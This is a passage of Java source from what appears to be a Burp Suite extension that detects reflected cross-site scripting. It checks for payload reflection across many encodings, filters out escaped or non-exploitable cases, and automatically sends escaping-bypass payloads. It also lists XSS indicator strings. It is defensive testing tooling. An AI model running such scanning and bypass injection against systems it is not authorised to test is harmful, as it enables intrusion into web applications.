                        parameter.put("PARAM_NAME_REFLECTED_IN_ERROR", true);
                    }
                }
                
                // CRITICAL: Check if payload is reflected in error message (with multiple encoding checks)
                boolean payloadReflectedInError = false;
                if (errorResponseBody != null && !errorResponseBody.isEmpty()) {
                    // Direct reflection checks
                    payloadReflectedInError = errorResponseBody.contains(encodedPayload) || 
                                             errorResponseBody.contains(payload) ||
                                             errorResponseBody.toLowerCase().contains(encodedPayload.toLowerCase()) ||
                                             errorResponseBody.toLowerCase().contains(payload.toLowerCase());
                    
                    // Check for HTML entity encoded reflection
                    if (!payloadReflectedInError) {
                        String htmlEncoded = payload.replace("<", "&lt;").replace(">", "&gt;")
                                                   .replace("\"", "&quot;").replace("'", "&#39;");
                        payloadReflectedInError = errorResponseBody.contains(htmlEncoded);
                    }
                    
                    // Check for URL encoded reflection
                    if (!payloadReflectedInError) {
                        String urlEncoded = helpers.urlEncode(payload);
                        payloadReflectedInError = errorResponseBody.contains(urlEncoded);
                    }
                    
                    // CRITICAL FIX: Do NOT use partial reflection - this causes false positives
                    // Partial matches are NOT sufficient proof of vulnerability
                    // Check for partial reflection of payload parts - REMOVED (too lenient)
                    // if (!payloadReflectedInError) {
                    //     String[] payloadParts = payload.split("[<>\"'()\\[\\]{}]");
                    //     int foundParts = 0;
                    //     for (String part : payloadParts) {
                    //         if (part.length() > 3 && errorResponseBody.contains(part)) {
                    //             foundParts++;
                    //         }
                    //     }
                    //     payloadReflectedInError = foundParts >= Math.max(1, payloadParts.length / 2); // NO - too lenient
                    // }
                    
                    // Check for XSS indicators in error
                    if (!payloadReflectedInError) {
                        String[] xssIndicators = {"<script", "alert", "onerror", "onload", "javascript:", "eval"};
                        int foundIndicators = 0;
                        for (String indicator : xssIndicators) {
                            if (payload.contains(indicator) && errorResponseBody.contains(indicator)) {
                                foundIndicators++;
                            }
                        }
                        payloadReflectedInError = foundIndicators >= 1; // Even one indicator is significant
                    }
                }
                
                // Store error response info for analysis
                if (parameter != null) {
                    parameter.put("ERROR_RESPONSE_CODE", responseCode);
                    parameter.put("ERROR_RESPONSE_BODY", errorResponseBody);
                    parameter.put("PAYLOAD_REFLECTED_IN_ERROR", payloadReflectedInError);
                    parameter.put("ERROR_RESPONSE_ANALYZED", true);
                }
                
                if (payloadReflectedInError) {
                    // Payload reflected in error response
                    // Continue with analysis - error responses can still be exploitable
                } else if (originalValueReflected || paramNameReflected) {
                    callbacks.printOutput("INFO: Parameter value/name reflected in error (" + responseCode + ") but payload not found - trying simpler payloads");
                    // Parameter is being processed - try simpler payloads
                    parameter.put("SHOULD_TRY_SIMPLE_PAYLOADS", true);
                } else {
                    callbacks.printOutput("INFO: No reflection detected in error response (" + responseCode + ") - payload may be filtered/rejected");
                }
            }
            
            // CRITICAL FIX: Store response for later use
            lastTestResponse = response;
            
            // Advanced response analysis with STRICT validation
            // Use encoded payload for analysis to check if it's reflected
            AdvancedResponseAnalysis analysis = analyzeResponseAdvanced(response, encodedPayload, parameter);
            if (analysis == null) {
                callbacks.printOutput("FAILED: Response analysis failed for parameter: " + parameter.get(NAME));
                return null;
            }
            
            // CRITICAL FIX: Only report if vulnerability is TRULY exploitable (not HTML encoded)
            // Check both original and encoded payload reflection
            boolean isVulnerable = analysis.isVulnerable() && !isPayloadHTMLEncoded(response, encodedPayload);
            
            // CRITICAL: Comprehensive payload reflection check with encoding awareness
            // Check for reflection in multiple encoded forms AND decoded forms to detect server escaping
            String responseBody = extractResponseBody(response);
            boolean payloadReflected = false;
            boolean serverEscapingDetected = false;
            String detectedEscapingType = null;
            
            if (responseBody != null && !responseBody.isEmpty()) {
                // Get original payload (before encoding) for decoded reflection checks
                String originalPayload = (String) parameter.get("ORIGINAL_PAYLOAD");
                if (originalPayload == null) {
                    originalPayload = payload; // Fallback to current payload if no original stored
                }
                
                // CRITICAL FIX: Check for BOTH encoded and decoded payload reflection
                // payload = original payload (e.g., <script>)
                // encodedPayload = URL-encoded payload (e.g., %3Cscript%3E)
                // Server might reflect either version, so check both
                
                // STEP 1: Check for encoded payload reflection (as we injected it)
                if (responseBody.contains(encodedPayload)) {
                    payloadReflected = true;
                    callbacks.printOutput("[XSSDetector] Encoded payload reflection detected (as injected): " + 
                                         encodedPayload.substring(0, Math.min(30, encodedPayload.length())));
                }
                
                // STEP 2: Check for original (decoded) payload reflection
                // This is KEY: We inject %3Cscript%3E but server might decode and reflect <script>
                if (!payloadReflected && responseBody.contains(payload)) {
                    payloadReflected = true;
                    callbacks.printOutput("[XSSDetector] Original payload reflection detected (server decoded it): " + 
                                         payload.substring(0, Math.min(30, payload.length())));
                }
                
                // STEP 3: Also check originalPayload if it's different from payload
                if (!payloadReflected && originalPayload != null && !originalPayload.equals(payload) && responseBody.contains(originalPayload)) {
                    payloadReflected = true;
                    callbacks.printOutput("[XSSDetector] Original payload reflection detected (from ORIGINAL_PAYLOAD)");
                }
                
                // STEP 4: CRITICAL - If we injected URL-encoded, try decoding and checking
                // Some servers might decode it differently
                if (!payloadReflected && encodedPayload != null && !encodedPayload.equals(payload)) {
                    try {
                        String urlDecoded = helpers.urlDecode(encodedPayload);
                        if (urlDecoded != null && !urlDecoded.equals(encodedPayload) && responseBody.contains(urlDecoded)) {
                            payloadReflected = true;
                            callbacks.printOutput("[XSSDetector] URL-decoded payload reflection detected: injected " + 
                                                 encodedPayload.substring(0, Math.min(30, encodedPayload.length())) + 
                                                 ", found " + urlDecoded.substring(0, Math.min(30, urlDecoded.length())));
                        }
                        
                        // Check double URL-decoded (some servers decode twice)
                        if (urlDecoded != null && !payloadReflected) {
                            String doubleUrlDecoded = helpers.urlDecode(urlDecoded);
                            if (doubleUrlDecoded != null && !doubleUrlDecoded.equals(urlDecoded) && responseBody.contains(doubleUrlDecoded)) {
                                payloadReflected = true;
                                callbacks.printOutput("[XSSDetector] Double URL-decoded payload reflection detected");
                            }
                        }
                    } catch (Exception e) {
                        // Ignore decode errors
                    }
                }
                
                // STEP 3: Use buildReflectionCandidates for comprehensive decoded checks
                // This generates all possible decoded variants
                if (!payloadReflected) {
                    List<String> reflectionCandidates = buildReflectionCandidates(payload);
                    for (String candidate : reflectionCandidates) {
                        if (candidate != null && responseBody.contains(candidate)) {
                            payloadReflected = true;
                            callbacks.printOutput("[XSSDetector] Payload reflection detected via decoded candidate: " + 
                                                candidate.substring(0, Math.min(30, candidate.length())));
                            break;
                        }
                    }
                }
                
                // STEP 4: Check for original payload (before any encoding) reflection
                if (!payloadReflected && originalPayload != null && !originalPayload.equals(payload)) {
                    if (responseBody.contains(originalPayload)) {
                        payloadReflected = true;
                        callbacks.printOutput("[XSSDetector] Original payload reflection detected (before encoding)");
                    }
                    
                    // Also check decoded variants of original payload
                    List<String> originalCandidates = buildReflectionCandidates(originalPayload);
                    for (String candidate : originalCandidates) {
                        if (candidate != null && responseBody.contains(candidate)) {
                            payloadReflected = true;
                            callbacks.printOutput("[XSSDetector] Original payload decoded variant reflection detected");
                            break;
                        }
                    }
                }
                
                // STEP 5: Check for URL-encoded reflection (if we sent URL-encoded)
                if (!payloadReflected && encodedPayload != null && !encodedPayload.equals(payload)) {
                    if (responseBody.contains(encodedPayload)) {
                        payloadReflected = true;
                        callbacks.printOutput("[XSSDetector] URL-encoded payload reflection detected (as sent)");
                    }
                }
                
                // CRITICAL FIX: Do NOT accept HTML-encoded reflection as exploitable
                // HTML-encoded payload means the server properly escaped it - NOT exploitable
                // STEP 6: Check for HTML entity encoded reflection (server escaping) - but mark as NOT exploitable
                if (!payloadReflected) {
                    String htmlEncoded = payload.replace("<", "&lt;").replace(">", "&gt;")
                                               .replace("\"", "&quot;").replace("'", "&#39;")
                                               .replace("&", "&amp;");
                    if (responseBody.contains(htmlEncoded)) {
                        // HTML-encoded means server escaped it properly - NOT exploitable
                        serverEscapingDetected = true;
                        detectedEscapingType = "HTML_ENTITY";
                        callbacks.printOutput("[XSSDetector] HTML entity encoded reflection detected (server escaping) - NOT exploitable");
                        // Do NOT set payloadReflected = true - this is NOT exploitable
                    }
                    
                    // Also check numeric HTML entities
                    String htmlNumericEncoded = payload.replace("<", "&#60;").replace(">", "&#62;")
                                                      .replace("\"", "&#34;").replace("'", "&#39;");
                    if (responseBody.contains(htmlNumericEncoded)) {
                        // HTML-encoded means server escaped it properly - NOT exploitable
                        serverEscapingDetected = true;
                        detectedEscapingType = "HTML_ENTITY_NUMERIC";
                        callbacks.printOutput("[XSSDetector] HTML numeric entity encoded reflection detected - NOT exploitable");
                        // Do NOT set payloadReflected = true - this is NOT exploitable
                    }
                }
                
                // STEP 7: Check for URL-encoded reflection in response (server might URL-encode)
                if (!payloadReflected) {
                    String urlEncoded = helpers.urlEncode(payload);
                    if (responseBody.contains(urlEncoded)) {
                        payloadReflected = true;
                        serverEscapingDetected = true;
                        detectedEscapingType = "URL";
                        callbacks.printOutput("[XSSDetector] URL-encoded reflection in response detected");
                    }
                }
                
                // STEP 8: Check for JSON-escaped reflection
                if (!payloadReflected) {
                    String jsonEscaped = payload.replace("\\", "\\\\").replace("\"", "\\\"")
                                                .replace("\n", "\\n").replace("\r", "\\r")
                                                .replace("\t", "\\t");
                    if (responseBody.contains(jsonEscaped)) {
                        payloadReflected = true;
                        serverEscapingDetected = true;
                        detectedEscapingType = "JSON";
                        callbacks.printOutput("[XSSDetector] JSON-escaped reflection detected");
                    }
                }
                
                // STEP 9: Check for unicode-encoded reflection
                if (!payloadReflected) {
                    String unicodeEncoded = payload.replace("<", "\\u003c").replace(">", "\\u003e")
                                                   .replace("\"", "\\u0022").replace("'", "\\u0027")
                                                   .replace("&", "\\u0026");
                    if (responseBody.contains(unicodeEncoded)) {
                        payloadReflected = true;
                        serverEscapingDetected = true;
                        detectedEscapingType = "UNICODE";
                        callbacks.printOutput("[XSSDetector] Unicode-encoded reflection detected");
                    }
                }
                
                // STEP 10: Check for double-encoded variants
                if (!payloadReflected) {
                    try {
                        String doubleUrlEncoded = helpers.urlEncode(helpers.urlEncode(payload));
                        if (responseBody.contains(doubleUrlEncoded)) {
                            payloadReflected = true;
                            callbacks.printOutput("[XSSDetector] Double URL-encoded reflection detected");
                        }
                    } catch (Exception e) {
                        // Ignore
                    }
                }
                
                // STEP 11: Use analysis results as fallback
                if (!payloadReflected && (analysis.isDirectReflection() || analysis.isEncodedReflection())) {
                    payloadReflected = true;
                    callbacks.printOutput("[XSSDetector] Payload reflection confirmed via analysis");
                }
                
                // CRITICAL FIX: Do NOT use partial reflection - this causes false positives
                // Partial matches are NOT sufficient proof of vulnerability
                // Only accept ACTUAL payload reflection (direct, decoded, or URL-encoded)
                // STEP 12: Removed partial reflection check - too lenient, causes false positives
                // if (!payloadReflected) {
                //     String[] payloadParts = payload.split("[<>\"'()\\[\\]{}]");
                //     int foundParts = 0;
                //     for (String part : payloadParts) {
                //         if (part.length() > 3 && responseBody.contains(part)) {
                //             foundParts++;
                //         }
                //     }
                //     if (foundParts >= Math.max(1, payloadParts.length / 2)) {
                //         payloadReflected = true; // NO - too lenient, causes false positives
                //         callbacks.printOutput("[XSSDetector] Partial payload reflection detected (" + foundParts + "/" + payloadParts.length + " parts)");
                //     }
                // }
                
                // CRITICAL: If server escaping detected, payload is NOT exploitable
                if (serverEscapingDetected && detectedEscapingType != null) {
                    callbacks.printOutput("[XSSDetector] Server escaping detected (" + detectedEscapingType + ") - payload safely escaped, NOT exploitable");
                    // This will be handled below - we'll set isVulnerable = false
                }
            }
            
            // CRITICAL: For JSON context, verify it's actually exploitable
            Object contentTypeObj = parameter.get("CONTENT_TYPE");
            Object reflectionContextObj = parameter.get("REFLECTION_CONTEXT");
            String paramContentType = contentTypeObj != null ? contentTypeObj.toString() : null;
            String paramReflectionContext = reflectionContextObj != null ? reflectionContextObj.toString() : null;
            boolean isJSONContext = (paramContentType != null && paramContentType.contains("application/json")) ||
                                   (paramReflectionContext != null && paramReflectionContext.contains("JSON"));
            
            if (isJSONContext && payloadReflected) {
                // CRITICAL: First check if payload is safely escaped in JSON string
                // If quotes/backslashes are escaped, it's a false positive
                boolean jsonStringExploitable = isJSONStringExploitable(responseBody, encodedPayload);
                if (!jsonStringExploitable) {
                    callbacks.printOutput("[XSSDetector] JSON string reflection is safely escaped - FALSE POSITIVE for parameter: " + parameter.get(NAME));
                    // Don't mark as vulnerable if JSON string is safely escaped
                    isVulnerable = false;
                    // Set confidence to 0 to ensure it's filtered
                    analysis.setConfidence(0.0);
                    analysis.setVulnerabilityType("Safely Escaped JSON String (False Positive)");
                    analysis.setContextVulnerable(false);
                    analysis.setDirectReflection(false);
                } else {
                    // JSON string is not safely escaped - check for JSONP or unsafe consumption
                    boolean jsonExploitable = isJSONExploitable(responseBody, encodedPayload);
                    if (!jsonExploitable) {
                        callbacks.printOutput("[XSSDetector] JSON reflection detected but not exploitable (no JSONP/unsafe consumption) for parameter: " + parameter.get(NAME));
                        // Don't mark as vulnerable if JSON is not exploitable
                        isVulnerable = false;
                    } else {
                        callbacks.printOutput("[XSSDetector] JSON reflection is exploitable (JSONP/unsafe consumption detected) for parameter: " + parameter.get(NAME));
                    }
                }
            }
            
            // CRITICAL: Only mark as vulnerable if payload is actually reflected AND (not JSON or JSON is exploitable)
            // AND server is NOT escaping the payload
            isVulnerable = isVulnerable && payloadReflected && !serverEscapingDetected;
            
            // If server escaping detected, mark as false positive
            if (serverEscapingDetected && payloadReflected) {
                isVulnerable = false;
                analysis.setConfidence(0.0);
                analysis.setVulnerabilityType("Safely Escaped by Server (" + detectedEscapingType + ") - False Positive");
                analysis.setContextVulnerable(false);
                analysis.setDirectReflection(false);
                callbacks.printOutput("[XSSDetector] FALSE POSITIVE: Payload reflected but safely escaped by server");
            }
            
            // ADVANCED: Record reflection tracking
            if (reflectionTracker != null && baseRequestResponse != null) {
                try {
                    IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
                    String endpointPattern = reqInfo.getUrl().toString().split("\\?")[0];
                    if (payloadReflected) {
                        reflectionTracker.recordReflection(paramName, reflectionContext, endpointPattern);
                    } else {
                        reflectionTracker.recordNonReflection(paramName, endpointPattern);
                    }
                } catch (Exception e) {
                    // Ignore
                }
            }
            
            // ADVANCED: Store result in cache
            if (responseCache != null && baseRequestResponse != null) {
                try {
                    List<String> patterns = new ArrayList<>();
                    if (analysis != null) {
                        List<String> evidence = analysis.getEvidence();
                        if (evidence != null) {
                            patterns.addAll(evidence);
                        }
                    }
                    responseCache.storeInCache(baseRequestResponse, paramName, isVulnerable, 
                        analysis != null ? analysis.getVulnerabilityType() : "Unknown",
                        patterns, reflectionContext, payloadReflected, helpers);
                } catch (Exception e) {
                    // Silently fail - caching is optional
                }
            }
            
            // FINAL VALIDATION LAYER: Comprehensive context-aware validation before reporting
            // This is the LAST check to ensure NO false positives
            if (isVulnerable) {
                // STEP 1: Context-aware exploitability validation
                boolean contextExploitable = true;
                String validationFailureReason = null;
                
                // Check JavaScript string context
                if (paramReflectionContext != null && 
                    (paramReflectionContext.contains("Script str") || paramReflectionContext.contains("JAVASCRIPT_STRING"))) {
                    boolean jsExploitable = isJavaScriptStringExploitable(responseBody, encodedPayload);
                    if (!jsExploitable) {
                        contextExploitable = false;
                        validationFailureReason = "JavaScript string safely escaped";
                        callbacks.printOutput("[XSSDetector] FINAL VALIDATION FAILED: " + validationFailureReason);
                    }
                }
                
                // Check JSON string context
                if (contextExploitable && isJSONContext) {
                    boolean jsonStrExploitable = isJSONStringExploitable(responseBody, encodedPayload);
                    if (!jsonStrExploitable) {
                        contextExploitable = false;
                        validationFailureReason = "JSON string safely escaped";
                        callbacks.printOutput("[XSSDetector] FINAL VALIDATION FAILED: " + validationFailureReason);
                    } else {
                        // Also check if JSON is exploitable (JSONP/unsafe consumption)
                        boolean jsonExpl = isJSONExploitable(responseBody, encodedPayload);
                        if (!jsonExpl) {
                            contextExploitable = false;
                            validationFailureReason = "JSON not exploitable (no JSONP/unsafe consumption)";
                            callbacks.printOutput("[XSSDetector] FINAL VALIDATION FAILED: " + validationFailureReason);
                        }
                    }
                }
                
                // Check HTML context (attribute, comment, etc.)
                if (contextExploitable && paramReflectionContext != null) {
                    if (paramReflectionContext.contains("Attribute") || paramReflectionContext.contains("ATTRIBUTE")) {
                        // Attribute context - check if payload can break out
                        // If payload is HTML-encoded in attribute, it's not exploitable
                        if (serverEscapingDetected && detectedEscapingType != null && 
                            (detectedEscapingType.contains("HTML") || detectedEscapingType.contains("ENTITY"))) {
                            contextExploitable = false;
                            validationFailureReason = "HTML attribute context with server escaping";
                            callbacks.printOutput("[XSSDetector] FINAL VALIDATION FAILED: " + validationFailureReason);
                        }
                    }
                    
                    if (paramReflectionContext.contains("Comment") || paramReflectionContext.contains("COMMENT")) {
                        // HTML comment context - payload in <!-- --> is not exploitable
                        if (responseBody.contains("<!--") && responseBody.contains("-->")) {
                            int commentStart = responseBody.indexOf("<!--");
                            int commentEnd = responseBody.indexOf("-->", commentStart);
                            if (commentStart >= 0 && commentEnd > commentStart) {
                                String commentContent = responseBody.substring(commentStart, commentEnd);
                                if (commentContent.contains(encodedPayload) || commentContent.contains(payload)) {
                                    contextExploitable = false;
                                    validationFailureReason = "Payload in HTML comment (not exploitable)";
                                    callbacks.printOutput("[XSSDetector] FINAL VALIDATION FAILED: " + validationFailureReason);
                                }
                            }
                        }
                    }
                }
                
                // STEP 2: Confidence score validation
                if (contextExploitable && analysis != null) {
                    double confidence = analysis.getConfidence();
                    if (confidence <= 0.0) {
                        contextExploitable = false;
                        validationFailureReason = "Confidence score is 0 (false positive)";
                        callbacks.printOutput("[XSSDetector] FINAL VALIDATION FAILED: " + validationFailureReason);
                    } else if (confidence < 30.0 && !analysis.isDirectReflection() && !analysis.isJavaScriptExecution()) {
                        // Low confidence without strong evidence - likely false positive
                        contextExploitable = false;
                        validationFailureReason = "Confidence too low (" + confidence + ") without strong evidence";
                        callbacks.printOutput("[XSSDetector] FINAL VALIDATION FAILED: " + validationFailureReason);
                    }
                }
                
                // STEP 3: Payload reflection validation
                if (contextExploitable && !payloadReflected) {
                    contextExploitable = false;
                    validationFailureReason = "Payload not reflected in response";
                    callbacks.printOutput("[XSSDetector] FINAL VALIDATION FAILED: " + validationFailureReason);
                }
                
                // STEP 4: Server escaping validation (final check)
                if (contextExploitable && serverEscapingDetected) {
                    contextExploitable = false;
                    validationFailureReason = "Server escaping detected (" + detectedEscapingType + ")";
                    callbacks.printOutput("[XSSDetector] FINAL VALIDATION FAILED: " + validationFailureReason);
                }
                
                // STEP 5: HTML encoding validation
                if (contextExploitable) {
                    boolean htmlEncoded = isPayloadHTMLEncoded(response, encodedPayload);
                    if (htmlEncoded && !analysis.isJavaScriptExecution()) {
                        // HTML-encoded payload is not exploitable unless in JavaScript execution context
                        contextExploitable = false;
                        validationFailureReason = "Payload HTML-encoded and not in JavaScript execution context";
                        callbacks.printOutput("[XSSDetector] FINAL VALIDATION FAILED: " + validationFailureReason);
                    }
                }
                
                // STEP 6: Update isVulnerable based on final validation
                if (!contextExploitable) {
                    isVulnerable = false;
                    if (analysis != null) {
                        analysis.setConfidence(0.0);
                        analysis.setVulnerabilityType("False Positive - " + (validationFailureReason != null ? validationFailureReason : "Validation Failed"));
                        analysis.setContextVulnerable(false);
                        analysis.setDirectReflection(false);
                    }
                    callbacks.printOutput("[XSSDetector] FINAL VALIDATION: Issue REJECTED - " + validationFailureReason);
                    return null; // Don't create issue
                }
                
                // CRITICAL FINAL VALIDATION: Verify payload is ACTUALLY in request AND reflected in response
                // This is the ABSOLUTE FINAL check before marking as CONFIRMED
                // testRequest is a String, need to check it
                boolean payloadInRequest = false;
                boolean payloadInResponse = false;
                
                if (testRequest != null && !testRequest.isEmpty()) {
                    String requestStr = testRequest;
                    payloadInRequest = requestStr.contains(encodedPayload) || requestStr.contains(payload);
                    
                    // Check for URL-encoded payload in query string if we injected encoded
                    if (!payloadInRequest && !encodedPayload.equals(payload)) {
                        int queryStart = requestStr.indexOf("?");
                        if (queryStart >= 0) {
                            String queryString = requestStr.substring(queryStart);
                            String checkParamName = (String) parameter.get(NAME);
                            if (queryString.contains(checkParamName + "=" + encodedPayload) ||
                                queryString.contains(helpers.urlEncode(checkParamName) + "=" + encodedPayload)) {
                                payloadInRequest = true;
                            }
                        }
                    }
                }
                
                // Verify payload is reflected in response
                if (responseBody != null && !responseBody.isEmpty()) {
                    payloadInResponse = responseBody.contains(encodedPayload) || responseBody.contains(payload);
                    if (!payloadInResponse && !encodedPayload.equals(payload)) {
                        try {
                            String decoded = helpers.urlDecode(encodedPayload);
                            if (decoded != null && responseBody.contains(decoded)) {
                                payloadInResponse = true;
                            }
                        } catch (Exception ignored) {}
                    }
                }
                
                // CRITICAL: Check if this is a redirect response - additional validation needed
                // Get response from baseRequestResponse to check status code
                if (baseRequestResponse != null && baseRequestResponse.getResponse() != null) {
                    try {
                        IResponseInfo responseInfoFinal = helpers.analyzeResponse(baseRequestResponse.getResponse());
                        int statusCodeFinal = responseInfoFinal.getStatusCode();
                        boolean isRedirectFinal = statusCodeFinal >= 300 && statusCodeFinal < 400;
                        
                        // CRITICAL: For redirects with javascript: in href, check if it's actually exploitable
                        // javascript: in href requires user click - not automatic exploitation
                        if (isRedirectFinal && payloadInResponse && payload.startsWith("javascript:")) {
                            // Check if payload is in href attribute (requires user click)
                            if (responseBody.contains("href=") && responseBody.contains(payload)) {
                                // This is a lower severity issue - requires user interaction
                                // Don't mark as "CONFIRMED" automatic exploitation
                                callbacks.printOutput("[XSSDetector] FALSE POSITIVE FILTERED: javascript: in href attribute in redirect - requires user click, not automatic exploitation");
                                return null; // Skip - not automatically exploitable
                            }
                            // Check if payload is ONLY in Location header (browsers block it)
                            java.util.List<String> headersFinal = responseInfoFinal.getHeaders();
                            for (String header : headersFinal) {
                                if (header.toLowerCase().startsWith("location:") && header.contains(payload)) {
                                    // Check if it's also in body
                                    if (!responseBody.contains(payload) && !responseBody.contains(encodedPayload)) {
                                        callbacks.printOutput("[XSSDetector] FALSE POSITIVE FILTERED: javascript: ONLY in Location header - browsers block javascript: in redirect Location headers");
                                        return null; // Skip - not exploitable
                                    }
                                }
                            }
                        }
                    } catch (Exception e) {
                        // Ignore - continue with validation
                    }
                }
                
                // CRITICAL: Only mark as CONFIRMED if we have PROOF in both request AND response
                if (!payloadInRequest || !payloadInResponse) {
                    callbacks.printOutput("[XSSDetector] FALSE POSITIVE FILTERED: Payload not in request (" + payloadInRequest + ") or response (" + payloadInResponse + ")");
                    callbacks.printOutput("[XSSDetector] Request check: " + (payloadInRequest ? "PASS" : "FAIL"));
                    callbacks.printOutput("[XSSDetector] Response check: " + (payloadInResponse ? "PASS" : "FAIL"));
                    return null; // Don't create issue - no proof
                }
                
                // FINAL VALIDATION PASSED - Proceed with issue creation
                callbacks.printOutput("[XSSDetector] FINAL VALIDATION PASSED: Payload confirmed in request AND response - creating issue");
                
                // ADVANCED: Record successful payload
                if (payloadTracker != null) {
                    payloadTracker.recordSuccess(payload, applicationType, reflectionContext);
                }
                
                // Professional logging - only log confirmed vulnerabilities
                callbacks.printOutput("[XSSDetector] XSS CONFIRMED: parameter '" + parameter.get(NAME) + 
                                    "' with payload '" + encodedPayload.substring(0, Math.min(40, encodedPayload.length())) + 
                                    (encodedPayload.length() > 40 ? "..." : "") + "'");
                
                // CRITICAL: Create vulnerability data with proper TEST_REQUEST and TEST_RESPONSE
                Map<String, Object> vulnerabilityData = new HashMap<>();
                vulnerabilityData.put("paramName", (String) parameter.get(NAME));
                vulnerabilityData.put("payload", encodedPayload);
                vulnerabilityData.put("ORIGINAL_PAYLOAD", payload);
                vulnerabilityData.put("ENCODED_PAYLOAD", encodedPayload); // Store as String for display
                vulnerabilityData.put("IS_ENCODED", !encodedPayload.equals(payload)); // Store boolean flag for encoding check
                vulnerabilityData.put("ENCODING_CONTEXT", reflectionContext);
                vulnerabilityData.put("SCAN_TYPE", "Advanced");
                // CRITICAL: Only set CONFIRMED_XSS = true AFTER we've verified payload in request AND response
                vulnerabilityData.put("CONFIRMED_XSS", true);
                vulnerabilityData.put("CONFIDENCE_SCORE", analysis.getConfidence());
                vulnerabilityData.put("XSS_SCORE", analysis.getConfidence());
                
                // CRITICAL: Store TEST_REQUEST and TEST_RESPONSE as byte[] for proper validation
                // testRequest is a String from createAdvancedTestRequest, convert to byte[]
                if (testRequest != null && !testRequest.isEmpty()) {
                    vulnerabilityData.put("TEST_REQUEST", testRequest.getBytes(StandardCharsets.UTF_8));
                }
                
                // CRITICAL: Store TEST_RESPONSE from actual response
                if (response != null && !response.isEmpty()) {
                    vulnerabilityData.put("TEST_RESPONSE", response.getBytes(StandardCharsets.UTF_8));
                }
                
                // CRITICAL: Add reflection context and other metadata
                String responseContentType = (String) parameter.get("CONTENT_TYPE");
                if (responseContentType != null) {
                    vulnerabilityData.put("CONTENT_TYPE", responseContentType);
                }
                vulnerabilityData.put("REFLECTION_CONTEXT", reflectionContext);
                
                // CRITICAL: Store textual evidence separately; MATCHES must remain byte offset ranges (List<int[]>)
                vulnerabilityData.put("EVIDENCE", analysis.getEvidence());
                try {
                    if (response != null && encodedPayload != null) {
                        List<int[]> payloadMatches = findAllByteMatches(
                            response.getBytes(StandardCharsets.UTF_8),
                            encodedPayload.getBytes(StandardCharsets.UTF_8),
                            50
                        );
                        if (payloadMatches != null && !payloadMatches.isEmpty()) {
                            vulnerabilityData.put("MATCHES", payloadMatches);
                        }
                    }
                } catch (Exception ignored) {
                    // Do not fail issue creation if we cannot compute offsets here.
                }
                
                // CRITICAL: Add reflected symbols and symbol reflection status
                Object reflectedSymbols = parameter.get("REFLECTED_SYMBOLS");
                Object symbolsReflected = parameter.get("SYMBOLS_REFLECTED");
                if (reflectedSymbols != null) {
                    vulnerabilityData.put("REFLECTED_SYMBOLS", reflectedSymbols);
                }
                if (symbolsReflected != null) {
                    vulnerabilityData.put("SYMBOLS_REFLECTED", symbolsReflected);
                }
                
                // CRITICAL: Add REFLECTED_IN if available
                Object reflectedIn = parameter.get(REFLECTED_IN);
                if (reflectedIn != null) {
                    vulnerabilityData.put("REFLECTED_IN", reflectedIn);
                }
                
                // CRITICAL: Check for duplicate issues before creating
                String issueKey = generateIssueKey(parameter, encodedPayload);
                if (isDuplicateIssue(issueKey)) {
                    callbacks.printOutput("SKIPPED: Duplicate issue detected for parameter: " + parameter.get(NAME) + 
                                        " with payload: " + encodedPayload.substring(0, Math.min(30, encodedPayload.length())) + "...");
                    return null;
                }
                
                // CRITICAL: Create scan issue using EnhancedIssueReporter
                EnhancedIssueReporter issueReporter = new EnhancedIssueReporter(helpers, callbacks, settings);
                IScanIssue issue = issueReporter.createEnhancedXSSIssue(baseRequestResponse, vulnerabilityData);
                if (issue != null) {
                    // Track created issue to prevent duplicates
                    createdIssues.add(issue);
                    markIssueAsCreated(issueKey);
                    
                    // Return the issue as a Map for compatibility
                    Map report = new HashMap();
                    report.put("ISSUE", issue);
                    report.put("ISSUE_CREATED", true);
                    report.put("VULNERABILITY_DATA", vulnerabilityData);
                    return report;
                }
            } else {
                // ADVANCED: Automatic bypass payload injection when escaping is detected
                // Check if payload is reflected but escaped (not exploitable)
                String bypassResponseBody = extractResponseBody(response);
                if (bypassResponseBody != null && !bypassResponseBody.isEmpty()) {
                    // Detect escaping patterns
                    Map<String, Object> escapingInfo = null;
                    try {
                        escapingInfo = detectEscapingPatterns(bypassResponseBody, encodedPayload);
                    } catch (Exception e) {
                        if (settings != null && settings.getVerboseLogging()) {
                            callbacks.printError("Error detecting escaping patterns in testParameterWithAdvancedTechniques: " + e.getMessage());
                        }
                    }
                    
                    boolean escapingDetected = escapingInfo != null && (Boolean) escapingInfo.get("ESCAPING_DETECTED");
                    
                    if (escapingDetected && escapingInfo != null) {
                        String escapingType = (String) escapingInfo.get("ESCAPING_TYPE");
                        String bypassReflectionContext = (String) parameter.get("REFLECTION_CONTEXT");
                        if (bypassReflectionContext == null) {
                            bypassReflectionContext = "UNKNOWN";
                        }
                        
                        callbacks.printOutput("[XSSDetector] ESCAPING DETECTED - Auto-injecting bypass payloads for: " + escapingType);
                        
                        // Generate bypass payloads based on detected escaping
                        String originalPayload = (String) parameter.get("ORIGINAL_PAYLOAD");
                        if (originalPayload == null) {
                            originalPayload = encodedPayload;
                        }
                        
                        List<String> bypassPayloads = null;
                        try {
                            bypassPayloads = generateBypassPayloads(originalPayload, escapingType, bypassReflectionContext);
                        } catch (Exception e) {
                            if (settings != null && settings.getVerboseLogging()) {
                                callbacks.printError("Error generating bypass payloads in testParameterWithAdvancedTechniques: " + e.getMessage());
                            }
                        }
                        
                        if (bypassPayloads == null || bypassPayloads.isEmpty()) {
                            // No bypass payloads generated - skip bypass testing
                            if (settings != null && settings.getVerboseLogging()) {
                                callbacks.printOutput("[XSSDetector] No bypass payloads generated for escaping type: " + escapingType);
                            }
                        } else {
                            // Try bypass payloads automatically
                            int bypassTested = 0;
                            int maxBypassTests = 20; // Limit to prevent excessive requests
                            
                            for (String bypassPayload : bypassPayloads) {
                            if (bypassTested++ >= maxBypassTests) break;
                            
                            try {
                                // Encode bypass payload for context
                                String encodedBypass = encodePayloadForContext(
                                    bypassPayload, 
                                    bypassReflectionContext,
                                    (String) parameter.get("CONTENT_TYPE"),
                                    (Integer) parameter.get(TYPE),
                                    (String) parameter.get("APPLICATION_TYPE")
                                );
                                
                                // Create test request with bypass payload
                                String bypassTestRequest = createAdvancedTestRequest(parameter, encodedBypass);
                                if (bypassTestRequest == null) {
                                    continue;
                                }
                                
                                // Send request
                                IHttpService httpService = (IHttpService) parameter.get("HTTP_SERVICE");
                                if (httpService == null) {
                                    continue;
                                }
                                
                                byte[] bypassRequestBytes = bypassTestRequest.getBytes(StandardCharsets.UTF_8);
